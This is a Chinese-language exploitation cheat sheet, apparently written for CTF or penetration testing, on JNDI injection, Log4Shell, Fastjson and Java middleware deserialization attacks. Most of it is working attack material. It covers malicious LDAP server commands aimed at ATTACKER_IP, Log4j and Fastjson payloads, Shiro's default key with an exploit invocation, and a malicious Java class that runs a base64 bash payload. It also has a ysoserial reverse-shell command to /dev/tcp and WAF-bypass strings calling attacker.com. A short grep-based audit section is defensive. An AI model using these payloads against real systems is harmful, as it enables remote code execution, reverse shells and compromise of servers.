# JNDI 注入、Fastjson、中间件专项

## JNDI 注入利用

JNDI 注入通过让目标服务器访问攻击者控制的 LDAP/RMI 服务来加载恶意类。

### 启动恶意 LDAP/RMI 服务
```
java -jar JNDIExploit.jar -i ATTACKER_IP -p 8888 -l 1389
```
同时监听 LDAP(1389) 和 HTTP(8888)。

### 触发 JNDI Lookup

**Log4j (CVE-2021-44228)**：
在任何用户输入中注入（Header/参数/User-Agent）：
```
${jndi:ldap://ATTACKER_IP:1389/Basic/Command/cat /flag.txt}
```

**Fastjson**：
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER_IP:1389/Exploit","autoCommit":true}
```

### JDK 版本对 JNDI 的影响
- **JDK < 8u191**：LDAP + 远程 codebase 直接加载恶意类（最简单）
- **JDK 8u191+**：`trustURLCodebase=false`，需要用本地 Gadget（BeanFactory + ELProcessor）
- **JDK 11+**：更多限制，可能需要 serialized gadget 替代 Reference

JNDIExploit 工具通常已经内置了各版本的绕过方式。

## Fastjson 专项

### 版本识别
发送畸形 JSON 触发报错：
```json
{"a":"\\x00"}
```
错误信息通常包含 Fastjson 版本号。

### 按版本选择 Payload
- **1.2.24 及以下**：直接使用 JdbcRowSetImpl（最经典）
- **1.2.25-1.2.47**：AutoType 绕过（使用 L 和 ; 绕过黑名单）
- **1.2.48-1.2.68**：expectClass 绕过
- **1.2.69+**：safeMode，几乎无法利用

### Payload 示例（≤1.2.24）
```json
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://ATTACKER_IP:1389/Exploit",
  "autoCommit":true
}
```

## 常见中间件专项

### Shiro rememberMe（CVE-2016-4437 等）
1. 识别：响应 `Set-Cookie: rememberMe=deleteMe`（即使登录失败也会返回）
2. 默认密钥：`kPH+bIxk5D2deZiIxcaaaA==`（大量 Shiro 使用默认密钥）
3. 利用：AES-CBC 加密 + 序列化 payload 放入 rememberMe Cookie
```
python3 shiro_exploit.py -u http://target -k kPH+bIxk5D2deZiIxcaaaA== -g CommonsCollections2 -c 'cat /flag.txt'
```

### WebLogic T3 协议
1. 识别：`nmap -sV -p 7001 target`（T3 协议指纹）
2. CVE 清单：CVE-2015-4852, CVE-2016-0638, CVE-2017-3248, CVE-2018-2628, CVE-2019-2725, CVE-2020-2555, CVE-2020-14882
3. 利用：使用对应 CVE 的 EXP 脚本或 ysoserial

### JBoss JMXInvokerServlet
1. 识别：访问 `/invoker/JMXInvokerServlet` 返回二进制数据
2. 利用：直接发送 ysoserial payload 到该端点

### Jenkins CLI
1. 识别：`/cli` 或端口 50000
2. CVE-2017-1000353：通过 CLI 协议发送序列化数据

## 补充: GadgetProbe 黑盒枚举

在黑盒场景下用 GadgetProbe（Burp 插件）探测 classpath 中可用库。原理：序列化对象嵌入目标类名，若类存在则触发 DNS 解析，配合 Burp Collaborator 使用。也可用 Java Deserialization Scanner 自动尝试所有 gadget chain。

**白盒快速检查**：

```bash
# 搜索目标应用是否包含常见 gadget 依赖
find . -iname "*commons*collection*"
grep -R InvokerTransformer .
grep -R "ObjectInputStream" . --include="*.java"
```

## 补充: marshalsec 手动 LDAP 服务

除 JNDIExploit 外，也可使用 marshalsec 手动搭建 LDAP 跳转服务：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker:8000/#Exploit"
```

**恶意类示例**（低版本 JDK，编译后放到 HTTP 服务器）：

```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}");
        } catch (Exception e) { e.printStackTrace(); }
    }
}
```

```bash
javac Exploit.java -source 8 -target 8 && python3 -m http.server 8000
```

**高版本 JDK 绕过**（JDK 8u121+ `trustURLCodebase=false`）：利用 ysoserial 生成序列化 payload，通过 JNDI-Exploit-Kit 分发：

```bash
# 生成 CommonsCollections5 反弹 shell payload
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser

# 用 JNDI-Exploit-Kit 提供 LDAP 服务
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```

## 补充: Log4Shell WAF 绕过与版本修复

**WAF 绕过变体**：

```text
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/}
${${env:X:-j}ndi${env:X:-:}${env:X:-l}dap${env:X:-:}//attacker.com/}
```

**版本修复时间线**：
- **2.15.0**：修复不完整，`127.0.0.1#attacker.com` 可绕过 allowedLdapHosts 检查
- **2.16.0**：移除 message lookup 功能，默认禁用 JNDI
- **2.17.0**：修复递归查询问题，仅在配置文件中允许有限 lookup

## 补充: 白盒审计关键词

```java
// 反序列化入口搜索模式
ObjectInputStream, readObject, readUnshare, readResolve, readExternal
XMLDecoder, XStream.fromXML
Serializable  // 实现此接口的类可被序列化
```

搜索命令：

```bash
grep -R "ObjectInputStream" . --include="*.java"
grep -R "readObject\|readResolve\|readExternal" . --include="*.java"
grep -R "XMLDecoder\|XStream" . --include="*.java"
```
